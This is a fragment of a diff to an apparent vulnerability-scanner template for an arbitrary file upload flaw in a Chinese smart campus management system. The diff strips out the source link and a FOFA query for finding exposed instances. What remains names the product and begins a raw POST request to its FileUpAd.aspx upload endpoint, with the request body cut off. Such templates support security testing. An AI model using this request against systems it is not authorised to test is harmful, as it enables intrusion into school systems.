@@ -3,12 +3,8 @@ info:
   name: 智慧校园安校易管理系统FileUpAd任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vavgqfzgam1rflwf'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: vavgqfzgam1rflwf
-    fofa: title="智慧综合管理平台登入"
 http:
 - raw:
   - 'POST /Module/FileUpPage/FileUpAd.aspx?file_tmid=upload HTTP/1.1
